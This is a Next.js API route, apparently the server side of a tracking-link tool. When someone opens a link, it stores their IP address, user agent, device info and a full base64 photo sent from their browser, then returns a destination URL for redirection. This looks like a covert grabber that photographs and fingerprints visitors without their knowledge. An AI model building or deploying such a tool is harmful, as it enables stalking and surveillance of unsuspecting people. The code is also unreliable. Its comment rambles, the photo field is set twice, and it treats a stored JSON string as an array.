import { db } from '@/lib/kv';
import { NextResponse } from 'next/server';

export async function POST(req) {
  const { id, photo, deviceInfo } = await req.json();
  if (!id) return NextResponse.json({ error: 'Missing id' }, { status: 400 });
  const link = await db.hgetall(`link:${id}`);
  if (!link) return NextResponse.json({ error: 'Link not found' }, { status: 404 });
  const result = {
    ip: req.headers.get('x-forwarded-for') || req.ip,
    userAgent: req.headers.get('user-agent'),
    photo: photo ? photo.substring(0, 100) + '...' : null, // we'll store full photo in production via base64? For simplicity, we can store the whole thing. But large. Better to store photo as a separate file? For demo, we store it directly in KV as base64 (limit 1MB). Here we'll store entire photo string.
    deviceInfo,
    timestamp: new Date().toISOString(),
  };
  const fullPhoto = photo; // store full base64
  result.photo = fullPhoto;
  const updatedResults = [...(link.results || []), result];
  await db.hset(`link:${id}`, { results: JSON.stringify(updatedResults) });
  return NextResponse.json({ success: true, destUrl: link.destUrl });
}
